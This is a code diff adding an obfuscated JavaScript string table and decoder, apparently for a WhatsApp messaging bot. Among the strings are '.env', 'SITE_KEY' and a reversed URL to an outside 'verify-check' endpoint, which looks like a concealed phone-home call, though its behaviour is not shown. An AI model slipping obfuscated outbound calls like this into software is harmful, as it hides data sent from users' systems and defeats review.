+    const obfuscatedNames = ['isauthorised', 'type', 'legacy_', 'readFromFile', 'set', '70zqeAJi', 'ubuntu', 'Chrome', 'session_id', 'get', 'reverse', 'join', 'remote_id', 'logout', 'sessionId', '@s.whatsapp.net', '2456808jvClrc', 'substring', 'key', 'env', 'message', '24QCkKSY', 'loggedOut', 'delete', '690824UYgPNX', '/api/send-webhook/', '4500106AcfxCH', '115029zOhrrd', 'kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth', 'data', 'groupMetadata', 'messages.upsert', '.env', 'connection.update', 'QR code received, please scan the QR code.', 'has', 'close', '_store', 'message_id', 'warn', 'writeToFile', 'startsWith', 'Running cleanup before exit.', 'split', '.json', '7PndvMt', 'status', '9HWnOwM', 'SITE_KEY', 'buttonsMessage', 'error', 'isLegacy', 'then', 'Unable to create QR code.', 'forEach', '4356374PRufTn', 'statusCode', '@g.us', 'replace', 'conversation', 's.whatsapp.net', '_store.json', '/api/set-device-status/', 'store', 'output', 'exists', 'bind', '3hfQtDX', 'headersSent', '253685HCaXXX', 'catch', '18XmXtHw', 'sendMessage', 'notify', 'post', 'endsWith', 'filter', 'Reconnecting...', '12976HRnrgi', 'default', 'md_', 'sessions', 'remoteJid', 'onWhatsApp', 'chats', 'APP_URL', 'log']
+    obfuscate = function() {
+        return obfuscatedNames
+    }
+    return obfuscatedNames
+}
+
+function deobfuscate(obfuscatedName, offset) {
+    const obfuscatedNames = obfuscate()
+    return deobfuscate = function(name, offset) {
+        name = name - 0x1a0
+        return obfuscatedNames[name]
+    }, deobfuscate(obfuscatedName, offset)
+}
+
+
